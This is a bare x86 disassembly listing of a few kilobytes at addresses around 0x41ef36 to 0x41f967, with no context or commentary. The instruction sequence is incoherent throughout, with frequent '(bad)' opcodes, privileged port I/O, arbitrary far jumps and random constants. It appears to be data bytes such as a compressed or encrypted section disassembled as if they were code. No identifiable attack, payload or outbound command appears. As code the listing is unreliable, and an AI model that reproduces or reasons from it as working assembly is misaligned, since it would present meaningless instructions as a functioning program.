  41ef36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef37:	fmul   QWORD PTR [edx]
  41ef39:	or     DWORD PTR [esp+esi*1-0x46],ebx
  41ef3d:	inc    ecx
  41ef3e:	mov    eax,ds:0x8f2761d8
  41ef43:	mov    bh,0x36
  41ef45:	call   0x1545b422
  41ef4a:	rol    DWORD PTR [eax],cl
  41ef4c:	out    dx,al
  41ef4d:	jmp    0xfb09:0xc2e51ad9
  41ef54:	mov    eax,ds:0x6e267426
  41ef59:	xchg   ecx,eax
  41ef5a:	das    
  41ef5b:	add    ebp,DWORD PTR [edx]
  41ef5d:	cmp    bl,BYTE PTR [ecx-0x6a]
  41ef60:	pop    esi
  41ef61:	mov    edi,0xf1a5150e
  41ef66:	in     eax,0xfd
  41ef68:	stos   DWORD PTR es:[edi],eax
  41ef69:	pop    edi
  41ef6a:	rol    ecx,cl
  41ef6c:	popa   
  41ef6d:	(bad)  
  41ef6e:	int3   
  41ef6f:	jle    0x41ef78
  41ef71:	(bad)  
  41ef72:	into   
  41ef73:	push   0x8b71e9a1
  41ef78:	inc    ebp
  41ef7a:	repz in eax,dx
  41ef7c:	popf   
  41ef7d:	ss fwait
  41ef7f:	lods   al,BYTE PTR ds:[esi]
  41ef80:	mov    bh,0xda
  41ef82:	jae    0x41ef75
  41ef84:	es sahf 
  41ef86:	adc    ch,BYTE PTR [esi+esi*8]
  41ef89:	call   0x92466b05
  41ef8e:	adc    esp,DWORD PTR [esi]
	...
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul esi,ebp,0xffffffff
  41f002:	imul   esp,DWORD PTR [ebx+0x149b4],0x4
  41f009:	add    DWORD PTR [eax],eax
  41f00b:	add    dl,bh
  41f00d:	xchg   edi,eax
  41f00e:	push   ss
  41f00f:	xor    esp,DWORD PTR fs:[edx-0x54b36a91]
  41f016:	in     al,dx
  41f017:	ins    DWORD PTR es:[edi],dx
  41f018:	mov    edx,0x5249c994
  41f01d:	jnp    0x41f03d
  41f01f:	aaa    
  41f020:	arpl   WORD PTR [ebx-0x6ea412c3],si
  41f026:	push   0x23ecf7c9
  41f02b:	xchg   BYTE PTR [edi+eax*2-0x601dcbf5],cl
  41f032:	cs jnp 0x41efb6
  41f035:	sbb    ebx,DWORD PTR [ebx]
  41f037:	push   0x7a
  41f039:	es stos BYTE PTR es:[edi],al
  41f03b:	icebp  
  41f03c:	call   0x4befe85c
  41f041:	hlt    
  41f042:	cmp    eax,0xe7ad1cf6
  41f047:	icebp  
  41f048:	mov    edx,0x1ae1ca07
  41f04d:	mov    ah,0xc
  41f04f:	call   0xe7fa:0x4af10da9
  41f056:	and    DWORD PTR [edx+0x61],esp
  41f059:	outs   dx,DWORD PTR ds:[esi]
  41f05a:	popf   
  41f05b:	shl    BYTE PTR [eax],cl
  41f05d:	stos   DWORD PTR es:[edi],eax
  41f05e:	jo     0x41f08b
  41f060:	mov    ds:0x1d10b491,al
  41f065:	test   DWORD PTR [edx-0x6e801790],esp
  41f06b:	pop    ecx
  41f06c:	xchg   BYTE PTR [ecx],bh
  41f06e:	and    eax,0x792d6ed6
  41f073:	retf   
  41f074:	fnstsw WORD PTR [eax+0x2937b19]
  41f07a:	sbb    cl,dh
  41f07c:	mov    WORD PTR [eax],ds
  41f07e:	add    ebx,DWORD PTR [esp+edx*2]
  41f081:	ss adc al,0x42
  41f084:	push   ecx
  41f085:	popf   
  41f086:	and    ebx,DWORD PTR [esi+esi*1+0xb]
  41f08a:	cld    
  41f08b:	sahf   
  41f08c:	and    ah,BYTE PTR [edx]
  41f08e:	push   ebx
  41f08f:	or     eax,esp
  41f091:	inc    ecx
  41f092:	es sub bh,ah
  41f095:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41f097:	or     bl,BYTE PTR [esi-0x59f54014]
  41f09d:	popa   
  41f09e:	mov    WORD PTR [ecx],?
  41f0a0:	xor    eax,0xa4e5066a
  41f0a5:	mov    edi,0x6b851aba
  41f0aa:	fisttp QWORD PTR [esi-0x21]
  41f0ad:	jmp    0x727e:0x6bfd2377
  41f0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b5:	lea    ebx,ds:0x9ec2d525
  41f0bb:	push   ds
  41f0bc:	fst    DWORD PTR [ebx]
  41f0be:	dec    esi
  41f0bf:	xor    bl,BYTE PTR [edi+esi*1+0x14]
  41f0c3:	ret    0x5a5f
  41f0c6:	inc    ebp
  41f0c7:	lahf   
  41f0c8:	js     0x41f0d3
  41f0ca:	or     BYTE PTR [edx+0x73],cl
  41f0cd:	fs pop esi
  41f0cf:	test   al,0x88
  41f0d1:	fsubr  DWORD PTR [ecx]
  41f0d3:	jp     0x41f131
  41f0d5:	ins    DWORD PTR es:[edi],dx
  41f0d6:	xchg   esi,eax
  41f0d7:	test   al,0xf
  41f0d9:	data16 mov dl,0xfe
  41f0dc:	imul   edi
  41f0de:	popf   
  41f0df:	out    dx,al
  41f0e0:	arpl   WORD PTR [eax],sp
  41f0e2:	repz (bad) 
  41f0e4:	dec    esp
  41f0e5:	mov    esp,0xa435aa0f
  41f0ea:	in     al,0x81
  41f0ec:	inc    edi
  41f0ed:	shl    BYTE PTR [ecx],0x93
  41f0f0:	dec    eax
  41f0f1:	xor    esi,edi
  41f0f3:	(bad)  
  41f0f5:	or     al,0x6c
  41f0f7:	out    dx,eax
  41f0f8:	test   DWORD PTR [ebx+0x76],ecx
  41f0fb:	(bad)  
  41f0fc:	into   
  41f0fd:	inc    eax
  41f0fe:	dec    edx
  41f0ff:	out    dx,al
  41f100:	dec    bx
  41f102:	sub    eax,0xa07a5bbc
  41f107:	imul   BYTE PTR [ebx+edx*2]
  41f10a:	scas   al,BYTE PTR es:[edi]
  41f10b:	adc    eax,0x55487dc1
	...
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0x32041f28
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	retf   0xf086
  41f18f:	cs pop edx
  41f191:	sub    al,0x14
  41f193:	rcr    bl,cl
  41f195:	loopne 0x41f1cb
  41f197:	push   esi
  41f198:	dec    ebp
  41f199:	in     al,0xfd
  41f19b:	mov    esi,0x830e27dc
  41f1a0:	xor    DWORD PTR [ebx-0xb23b327],0x33
  41f1a7:	pusha  
  41f1a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1a9:	stc    
  41f1aa:	into   
  41f1ab:	shr    DWORD PTR [esi+ecx*4],0xc
  41f1af:	mov    ah,0x2
  41f1b1:	dec    edx
  41f1b2:	aas    
  41f1b3:	scas   al,BYTE PTR es:[edi]
  41f1b4:	bound  edi,QWORD PTR [eax+0x2cd6ce57]
  41f1ba:	cmc    
  41f1bb:	dec    edi
  41f1bc:	lds    ebp,FWORD PTR [eax]
  41f1be:	mov    esi,0xb10c2834
  41f1c3:	mov    cl,0x82
  41f1c5:	(bad)  
  41f1c6:	shr    ebp,0xb2
  41f1c9:	or     esi,DWORD PTR [eax]
  41f1cb:	ds cmc 
  41f1cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1ce:	and    BYTE PTR [eax-0x62785f20],dl
  41f1d4:	xchg   edi,eax
  41f1d5:	fs das 
  41f1d7:	mov    eax,ds:0x54e19569
  41f1dc:	and    ebx,DWORD PTR [ecx+0x1d73621f]
  41f1e2:	pop    edi
  41f1e3:	pop    ecx
  41f1e4:	cmp    al,0x96
  41f1e6:	test   BYTE PTR ds:0x8deb6139,0xe4
  41f1ed:	cmp    eax,0x3418ed4
  41f1f2:	test   eax,0x3c964a55
  41f1f7:	mov    al,ds:0xb7651e25
  41f1fc:	add    esi,0xffffffb5
  41f1ff:	sbb    BYTE PTR [edi*1-0x413fe39a],ch
  41f206:	xor    DWORD PTR [esi+eax*1],eax
  41f209:	fistp  QWORD PTR [eax+0x6c]
  41f20c:	(bad)  
  41f20d:	jmp    FWORD PTR [ebx]
  41f20f:	cld    
  41f210:	mov    esi,0xfaa94f27
  41f215:	pop    edi
  41f216:	adc    eax,DWORD PTR ds:0x914c55e8
  41f21c:	add    BYTE PTR [ecx],ch
  41f21e:	xchg   edx,eax
  41f21f:	mov    ebp,0x8a2f6e3e
  41f224:	test   DWORD PTR [ecx-0x24],ecx
  41f227:	mov    eax,?
  41f229:	push   ebx
  41f22a:	cmp    ecx,DWORD PTR [esi+edx*1-0x382cd9cc]
  41f231:	lea    edx,[edx]
  41f233:	adc    eax,0x5a2bd6fc
  41f238:	popa   
  41f239:	arpl   WORD PTR [ebx+0x3cb32962],si
  41f23f:	inc    esi
  41f240:	iret   
  41f241:	push   edi
  41f242:	fadd   st(7),st
  41f244:	test   al,0xaa
  41f246:	jmp    0xa7f2:0xc7ddd6e
  41f24d:	add    eax,ebx
  41f24f:	push   edx
  41f250:	dec    edx
  41f251:	fwait
  41f252:	xchg   DWORD PTR [ebx+0xaa6e47e],edx
  41f258:	fistp  WORD PTR [edx+0x509e2324]
  41f25e:	enter  0x778,0xdd
  41f262:	xor    edi,DWORD PTR [ecx+0x13]
  41f265:	or     eax,0xcd7ac145
  41f26a:	xor    BYTE PTR [eax+eiz*4-0x20156314],ah
  41f271:	mov    edx,0x397ba524
  41f276:	ret    0x2923
  41f279:	sub    bl,al
  41f27b:	loop   0x41f2f1
  41f27d:	adc    eax,0x163667aa
  41f282:	mov    DWORD PTR [ebx],edi
  41f284:	std    
  41f285:	lea    edi,[edi+eax*2-0x5c]
  41f289:	(bad)  
  41f28a:	in     al,dx
  41f28b:	test   al,0x3f
  41f28d:	jnp    0x41f2db
  41f28f:	jo     0x41f291
	...
  41f2f1:	add    BYTE PTR [eax],al
  41f2f3:	add    BYTE PTR [ecx+0x1b],dl
  41f2f6:	jmp    DWORD PTR [esi-0x1]
  41f2f9:	out    0xd9,al
  41f2fb:	aas    
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f2ef
  41f301:	jl     0x41f2c5
  41f303:	cmp    edi,DWORD PTR [ebx+ecx*2+0x1040001]
  41f30a:	add    BYTE PTR [eax],al
  41f30c:	into   
  41f30d:	jno    0x41f2e4
  41f30f:	call   0x2c87512a
  41f314:	mov    WORD PTR [ecx-0x405ca96d],?
  41f31a:	mov    bh,0x99
  41f31c:	into   
  41f31d:	popf   
  41f31e:	into   
  41f31f:	adc    al,0xf1
  41f321:	pop    es
  41f322:	sub    bh,dl
  41f324:	dec    edx
  41f325:	xchg   esi,eax
  41f326:	jmp    0xe381:0xe392866d
  41f32d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f32e:	inc    esp
  41f32f:	aaa    
  41f330:	cmp    al,0x90
  41f332:	xchg   edx,eax
  41f333:	lock repz jg 0x41f36f
  41f337:	and    DWORD PTR ss:[ecx-0x65ec4fa9],0xfe4145d5
  41f342:	test   eax,0x53a73484
  41f347:	fwait
  41f348:	xchg   ebp,eax
  41f349:	(bad)  
  41f34a:	jb     0x41f368
  41f34c:	sub    ebx,DWORD PTR [edx+eiz*2+0x7c]
  41f350:	xchg   edi,eax
  41f351:	inc    eax
  41f352:	bound  esi,QWORD PTR ds:0x2f0513bc
  41f358:	or     DWORD PTR [ebp-0xa],edi
  41f35b:	xchg   ebp,eax
  41f35c:	fstp   TBYTE PTR [eax-0x46]
  41f35f:	push   ebx
  41f360:	pushf  
  41f361:	xor    BYTE PTR [ecx],dl
  41f363:	pop    ebx
  41f364:	ins    BYTE PTR es:[edi],dx
  41f365:	call   DWORD PTR [eax]
  41f367:	and    al,bh
  41f369:	imul   edi,DWORD PTR [ebp-0x1be589f8],0x2c474f5e
  41f373:	xchg   ebx,eax
  41f375:	lahf   
  41f376:	and    dl,BYTE PTR [esi]
  41f378:	mov    ecx,DWORD PTR [edi+0x6d]
  41f37b:	inc    ebp
  41f37c:	sbb    cl,BYTE PTR [esp+edx*8]
  41f37f:	fs (bad) 
  41f381:	jle    0x41f35e
  41f383:	cmp    eax,0x75228921
  41f388:	or     BYTE PTR [ecx],dl
  41f38a:	adc    DWORD PTR [eax+ebx*2],eax
  41f38d:	xchg   edx,eax
  41f38e:	ss push eax
  41f390:	loope  0x41f3a7
  41f392:	ins    BYTE PTR es:[edi],dx
  41f393:	gs inc esi
  41f395:	xor    cl,al
  41f397:	dec    ebx
  41f398:	(bad)  
  41f399:	enter  0x2880,0xa5
  41f39d:	dec    esp
  41f39e:	std    
  41f39f:	retf   0xdfda
  41f3a2:	fstp   TBYTE PTR [ebx+0x1c]
  41f3a5:	mov    DWORD PTR [ecx+0x23],esp
  41f3a8:	std    
  41f3a9:	rcl    bh,1
  41f3ab:	iret   
  41f3ac:	adc    bh,BYTE PTR ss:[ebp-0x7cbaadd5]
  41f3b3:	adc    DWORD PTR [edx+0x5f568404],0x37
  41f3ba:	imul   esi,edi,0xa4886acc
  41f3c0:	outs   dx,BYTE PTR ds:[esi]
  41f3c1:	shl    DWORD PTR [ecx+0x21dcf644],1
  41f3c7:	test   DWORD PTR [ebx+0x79],eax
  41f3ca:	call   0x9700:0x9a9fde26
  41f3d1:	jg     0x41f36a
  41f3d3:	call   0x3a7f:0x42cc5922
  41f3da:	mov    bh,0xa7
  41f3dc:	sub    al,0xf8
  41f3de:	ret    0xc2d6
  41f3e1:	fnstsw WORD PTR [edi+0x61dbc094]
  41f3e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3e8:	lods   eax,DWORD PTR ds:[esi]
  41f3e9:	mov    ebx,0xee76dde
  41f3ee:	sbb    al,dl
  41f3f0:	adc    esp,eax
  41f3f2:	sbb    ebp,DWORD PTR [edi+0x11a9ff17]
  41f3f8:	sub    DWORD PTR [ecx],edi
  41f3fa:	jmp    0x41f3e6
  41f3fc:	(bad)  
  41f3fd:	rol    BYTE PTR [eax-0x2d4a4c99],cl
  41f403:	pop    ecx
  41f404:	fst    QWORD PTR [esi+0x62]
  41f407:	inc    esi
  41f408:	jmp    0x95c7ffa4
  41f40d:	popf   
  41f40e:	jns    0x41f3de
	...
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x44
  41f481:	stos   BYTE PTR es:[edi],al
  41f482:	repz mov al,0xc0
  41f485:	dec    esp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    al,0x1
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	dec    eax
  41f48d:	xor    al,0x35
  41f48f:	pop    es
  41f490:	test   al,0x49
  41f492:	jae    0x41f41e
  41f494:	mov    ds:0x97770b9a,al
  41f499:	jmp    0x41f43f
  41f49b:	jb     0x41f447
  41f49d:	mov    esi,0x57531c14
  41f4a2:	jae    0x41f4b4
  41f4a4:	not    BYTE PTR [esi-0x5cc76d9a]
  41f4aa:	mov    ch,bh
  41f4ac:	out    0xcd,al
  41f4ae:	loope  0x41f43a
  41f4b0:	ins    BYTE PTR es:[edi],dx
  41f4b1:	into   
  41f4b2:	enter  0x411,0x73
  41f4b6:	sub    eax,0x66189d70
  41f4bb:	dec    ebx
  41f4bc:	adc    al,dl
  41f4be:	out    0xe1,al
  41f4c0:	xor    eax,0x3b09c9f1
  41f4c5:	mov    bh,0x3b
  41f4c7:	mov    ds:0xac0150e2,al
  41f4cc:	shl    DWORD PTR [esi-0x4e],1
  41f4cf:	or     cl,BYTE PTR [edx]
  41f4d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4d2:	cmp    BYTE PTR [ebx+0x42],bh
  41f4d5:	popf   
  41f4d6:	inc    edi
  41f4d7:	loop   0x41f498
  41f4d9:	das    
  41f4da:	aam    0x4
  41f4dc:	je     0x41f529
  41f4de:	scas   al,BYTE PTR es:[edi]
  41f4df:	or     BYTE PTR [ecx+0x41],dl
  41f4e2:	inc    ebx
  41f4e3:	xchg   edx,eax
  41f4e4:	shr    cl,1
  41f4e6:	popf   
  41f4e7:	mov    ebp,0x44ef1b20
  41f4ec:	in     eax,0x85
  41f4ee:	xchg   DWORD PTR [ecx+0x67470b8d],esp
  41f4f4:	mov    ah,0xae
  41f4f6:	pop    esi
  41f4f7:	xchg   ebx,ebx
  41f4f9:	(bad)  
  41f4fa:	cmp    al,BYTE PTR [esi+0x17]
  41f4fd:	dec    esp
  41f4fe:	fstp   TBYTE PTR [eax-0x67]
  41f501:	mov    ds:0x601a804e,eax
  41f506:	add    DWORD PTR [ebp-0x65],esp
  41f509:	ins    BYTE PTR es:[edi],dx
  41f50a:	dec    edx
  41f50b:	dec    edx
  41f50c:	xchg   edx,eax
  41f50d:	add    eax,DWORD PTR [ecx-0x1fa0d5a5]
  41f513:	repz idiv DWORD PTR [edx-0x23]
  41f517:	sahf   
  41f518:	ins    DWORD PTR es:[edi],dx
  41f519:	mov    ebx,0x87df7d93
  41f51e:	jmp    0xa987:0x3a43495f
  41f525:	mov    ah,0x82
  41f527:	jmp    0x41f535
  41f529:	push   esp
  41f52a:	stc    
  41f52b:	or     DWORD PTR [esi+0x68],ebp
  41f52e:	xchg   ebx,eax
  41f52f:	cmp    eax,0x6238930e
  41f534:	mov    bl,0xb9
  41f536:	or     cl,BYTE PTR [edx+0xe2a5225]
  41f53c:	push   cs
  41f53d:	and    edi,eax
  41f53f:	xchg   DWORD PTR [edi+esi*8-0x29d76f2c],esp
  41f546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f547:	es repz popa 
  41f54a:	adc    al,0xc2
  41f54c:	xor    al,0xb9
  41f54e:	push   esi
  41f54f:	push   cs
  41f550:	repnz mov al,ds:0x6d2cd560
  41f556:	out    0xc1,al
  41f558:	mov    bh,0xb2
  41f55a:	cmp    al,0xfc
  41f55c:	shl    bl,0x6f
  41f55f:	les    ebp,FWORD PTR [edx+0x40b68834]
  41f565:	push   ds
  41f566:	and    edx,ebp
  41f568:	pop    esi
  41f569:	fisttp QWORD PTR [edx+0x1fa1ebae]
  41f56f:	xor    eax,0x69380405
  41f574:	dec    ebx
  41f575:	fwait
  41f576:	xchg   eax,eax
  41f578:	addr16 mov edi,0x9d4f089c
  41f57e:	imul   esi,esi,0x3fb4fede
  41f584:	xchg   edi,eax
  41f585:	popa   
  41f586:	into   
  41f587:	dec    ebx
  41f588:	into   
  41f589:	push   ebx
  41f58a:	fcomp  DWORD PTR [ebx]
  41f58c:	pop    ebx
  41f58d:	push   ds
  41f58e:	or     al,BYTE PTR [eax+eax*1+0x0]
	...
  41f5f1:	add    BYTE PTR [eax],al
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x60d8:0xa5e2d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	cmp    BYTE PTR [ecx+0x2813095a],al
  41f612:	add    al,0xf7
  41f614:	cwde   
  41f615:	test   DWORD PTR [eax],edi
  41f617:	mov    esp,0x9d1173ce
  41f61c:	pop    ss
  41f61d:	mov    bh,0xd
  41f61f:	sar    BYTE PTR ds:0xfe006f8,1
  41f625:	mov    al,0xfe
  41f627:	inc    esi
  41f628:	mov    edi,DWORD PTR [ebx]
  41f62a:	data16 add BYTE PTR [eax-0x3486811],dl
  41f631:	xor    bl,dh
  41f633:	pusha  
  41f634:	rcr    DWORD PTR [eax],cl
  41f636:	les    ebx,FWORD PTR [ebp+0x3e1a9258]
  41f63c:	int    0x58
  41f63e:	inc    esi
  41f63f:	in     eax,0x5e
  41f641:	popa   
  41f642:	cmp    DWORD PTR [ebx],edi
  41f644:	jge    0x41f616
  41f646:	mov    ch,ah
  41f648:	inc    ebx
  41f649:	cmp    BYTE PTR [edi-0x75],0x95
  41f64d:	jnp    0x41f672
  41f64f:	ficom  DWORD PTR [eax]
  41f651:	in     eax,dx
  41f652:	mov    eax,ds:0x276a033c
  41f657:	push   esp
  41f658:	dec    edx
  41f659:	jno    0x41f6b2
  41f65b:	and    BYTE PTR [edi-0x2029fcb5],0xfd
  41f662:	xor    dh,BYTE PTR [ebp+0x6f]
  41f665:	sub    DWORD PTR [edi],0x9f28fbb4
  41f66b:	cwde   
  41f66c:	push   0xffffffc8
  41f66e:	mov    dl,0x98
  41f670:	call   0xac24:0x965059a0
  41f677:	fs in  al,0x3a
  41f67a:	pop    esi
  41f67b:	aas    
  41f67c:	fwait
  41f67d:	(bad)  
  41f67e:	inc    DWORD PTR [edi-0x33c980ae]
  41f684:	fcomp  DWORD PTR [esi]
  41f686:	ja     0x41f634
  41f688:	mov    eax,0x7afcddc6
  41f68d:	jecxz  0x41f69c
  41f68f:	add    eax,0x14e6b725
  41f694:	jmp    0x41f6a1
  41f696:	sbb    DWORD PTR [eax],edx
  41f698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f699:	icebp  
  41f69a:	mov    ah,0x73
  41f69c:	out    dx,al
  41f69d:	out    0x62,eax
  41f69f:	fld    DWORD PTR [edx+0x530ab1d6]
  41f6a5:	scas   al,BYTE PTR es:[edi]
  41f6a6:	add    DWORD PTR fs:[edi+0x59],ebp
  41f6aa:	cdq    
  41f6ab:	in     eax,dx
  41f6ac:	ss ss jo 0x41f63c
  41f6b0:	clc    
  41f6b1:	xor    BYTE PTR [edi],bl
  41f6b3:	xchg   ecx,eax
  41f6b4:	pop    ecx
  41f6b5:	(bad)  
  41f6b6:	arpl   bx,di
  41f6b8:	and    BYTE PTR [ebp+0x2ea9e2ab],0x9a
  41f6bf:	push   ebx
  41f6c0:	xchg   ebx,eax
  41f6c1:	(bad)  
  41f6c2:	mov    cl,BYTE PTR [ecx-0x3]
  41f6c5:	outs   dx,BYTE PTR ds:[esi]
  41f6c6:	push   0x919df994
  41f6cb:	popa   
  41f6cc:	je     0x41f6f2
  41f6ce:	call   0x860636e4
  41f6d3:	mov    ah,0x52
  41f6d5:	loop   0x41f700
  41f6d7:	xchg   DWORD PTR [ebp-0x7c1ecfa6],esi
  41f6dd:	push   edx
  41f6de:	mov    ch,0x3c
  41f6e0:	sti    
  41f6e1:	mov    ah,0x1
  41f6e3:	hlt    
  41f6e4:	jne    0x41f6c8
  41f6e6:	(bad)  
  41f6e7:	ins    DWORD PTR es:[edi],dx
  41f6e8:	lods   al,BYTE PTR ds:[esi]
  41f6e9:	in     al,0x3
  41f6eb:	sub    al,0xb7
  41f6ed:	in     al,dx
  41f6ee:	dec    edi
  41f6ef:	mov    dh,0x13
  41f6f1:	pop    ebp
  41f6f2:	xchg   esp,eax
  41f6f3:	test   BYTE PTR [esi-0x18c881a4],bh
  41f6f9:	pop    eax
  41f6fa:	imul   ebx,DWORD PTR [esi],0x130942ca
  41f700:	rcr    DWORD PTR [ecx+eiz*2],cl
  41f703:	inc    ecx
  41f704:	das    
  41f705:	cld    
  41f706:	mov    edx,0xcb9f520e
  41f70b:	push   ds
  41f70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f70d:	mov    ebx,0xcba
	...
  41f772:	add    BYTE PTR [eax],al
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x57d:0xc86c62d2
  41f783:	call   0x104:0x14ec8
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	xchg   ebx,eax
  41f78d:	cmp    ebx,DWORD PTR [ebx-0x73]
  41f790:	bound  edi,QWORD PTR [esi+0x7d651f18]
  41f796:	test   bl,0x7
  41f799:	mul    esi
  41f79b:	jb     0x41f7c1
  41f79d:	stc    
  41f79e:	shr    BYTE PTR [edi-0xce6e049],0x9b
  41f7a5:	xlat   BYTE PTR ds:[ebx]
  41f7a6:	inc    esp
  41f7a7:	hlt    
  41f7a8:	adc    cl,BYTE PTR [eax+0x4c2a6e0b]
  41f7ae:	retf   
  41f7af:	dec    ebp
  41f7b0:	jae    0x41f82f
  41f7b2:	(bad)  
  41f7b3:	push   esi
  41f7b4:	inc    esi
  41f7b5:	sub    ebx,DWORD PTR [ebx-0x331b5f16]
  41f7bb:	mov    eax,ds:0x75eb40cd
  41f7c0:	push   0xffffffe2
  41f7c2:	dec    bp
  41f7c4:	loopne 0x41f7f3
  41f7c6:	xor    eax,0x23c65e60
  41f7cb:	sub    ch,0x11
  41f7ce:	inc    esp
  41f7cf:	arpl   WORD PTR [ecx],ax
  41f7d1:	mov    eax,ds:0x9d3ff72e
  41f7d6:	adc    ch,BYTE PTR [eax-0x1f0e1516]
  41f7dc:	test   DWORD PTR gs:[edx-0x11],0x9aa525ce
  41f7e4:	gs loope 0x41f77f
  41f7e7:	and    al,0x8d
  41f7e9:	mov    ds:0xa7ea466b,al
  41f7ee:	in     al,dx
  41f7ef:	movq   QWORD PTR [ecx-0x63],mm3
  41f7f3:	shr    esp,1
  41f7f5:	cmp    eax,0x96dc2dc7
  41f7fa:	stos   DWORD PTR es:[edi],eax
  41f7fb:	je     0x41f837
  41f7fd:	mov    al,0x98
  41f7ff:	push   esi
  41f800:	pop    ds
  41f801:	push   edi
  41f802:	jo     0x41f82c
  41f804:	xchg   ebx,eax
  41f805:	jle    0x41f87c
  41f807:	add    eax,0xc6c3f76d
  41f80c:	and    esi,DWORD PTR [ebx+ecx*2-0x4799c78d]
  41f813:	sbb    ch,dh
  41f815:	lods   al,BYTE PTR ds:[esi]
  41f816:	pop    ebp
  41f817:	outs   dx,BYTE PTR ds:[esi]
  41f818:	dec    ecx
  41f819:	dec    edx
  41f81a:	ret    
  41f81b:	out    0x62,al
  41f81d:	retf   0x1801
  41f820:	sub    edi,eax
  41f822:	scas   al,BYTE PTR es:[edi]
  41f823:	jg     0x41f867
  41f825:	and    bh,ch
  41f827:	mov    DWORD PTR [edx+ebp*8-0xa],ecx
  41f82b:	dec    ebx
  41f82c:	jne    0x41f800
  41f82e:	mov    edi,0xa9b64f53
  41f833:	pop    esp
  41f834:	xor    DWORD PTR [edi-0x7d],esi
  41f837:	mul    esi
  41f839:	sbb    BYTE PTR [edx+0x48],ch
  41f83c:	stos   DWORD PTR es:[edi],eax
  41f83d:	cli    
  41f83e:	dec    esp
  41f83f:	mov    dl,0x41
  41f841:	push   ebx
  41f842:	in     eax,0x7a
  41f844:	out    dx,al
  41f845:	out    dx,eax
  41f846:	pusha  
  41f847:	sub    BYTE PTR [edx+0x39],ah
  41f84a:	pop    es
  41f84b:	sub    DWORD PTR [esp+edx*1+0x2a763e37],0xffffff84
  41f853:	dec    esi
  41f854:	mov    ah,0xde
  41f856:	popf   
  41f857:	dec    ecx
  41f858:	cmp    ah,BYTE PTR [ebx-0x5f]
  41f85b:	in     al,0xc2
  41f85d:	retf   
  41f85e:	jmp    0x41f870
  41f860:	inc    edi
  41f861:	mov    bl,0xb8
  41f863:	les    ebp,FWORD PTR [ecx+ebp*2+0x28]
  41f867:	xchg   ebx,eax
  41f868:	xchg   DWORD PTR [edx],edi
  41f86a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f86b:	sar    edi,0x12
  41f86e:	cld    
  41f86f:	bnd ret 
  41f871:	ja     0x41f89a
  41f873:	fst    DWORD PTR [eax+0x6f]
  41f876:	adc    al,0x9c
  41f878:	push   cs
  41f879:	sbb    dh,BYTE PTR [ebp+0x3735741f]
  41f87f:	mov    esi,0xda2ff34a
  41f884:	icebp  
  41f885:	or     eax,0x2987a557
  41f88a:	adc    dl,BYTE PTR [ebp-0x4]
  41f88d:	mov    ds:0xf6a,eax
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	aaa    
  41f901:	loope  0x41f93e
  41f903:	mov    ds:0x14fcc,al
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	xor    BYTE PTR [eax*1-0x3513e19c],dh
  41f913:	pop    ebx
  41f914:	sbb    bl,ch
  41f916:	push   esi
  41f917:	mov    al,0xda
  41f919:	pop    ds
  41f91a:	int    0x39
  41f91c:	fiadd  WORD PTR [esi]
  41f91e:	jmp    0x41f91d
  41f920:	lock mov ecx,0x26a65a03
  41f926:	into   
  41f927:	jge    0x41f8fb
  41f929:	inc    ebp
  41f92a:	out    0xd4,eax
  41f92c:	or     eax,0x9b85ad91
  41f931:	xor    DWORD PTR [esp+edx*8+0x75e004bd],0xe
  41f939:	mul    BYTE PTR [edi-0x2bdc158b]
  41f93f:	data16 daa 
  41f941:	pop    ebp
  41f942:	fcom   QWORD PTR [ebx-0x3f]
  41f945:	and    al,BYTE PTR [ecx+ebp*2+0x60]
  41f949:	aas    
  41f94a:	push   cs
  41f94b:	jns    0x41f8e5
  41f94d:	test   eax,0x84b0bfab
  41f952:	pushf  
  41f953:	dec    eax
  41f954:	aaa    
  41f955:	lahf   
  41f956:	loop   0x41f912
  41f958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f959:	sbb    al,0x4a
  41f95b:	frstor [eax-0x14]
  41f95e:	div    bh
  41f960:	cmp    al,0xbd
  41f962:	mov    esp,DWORD PTR [edx-0x79]
  41f965:	lods   al,BYTE PTR ds:[esi]
  41f966:	outs   dx,DWORD PTR ds:[esi]
  41f967:	pop    ebp
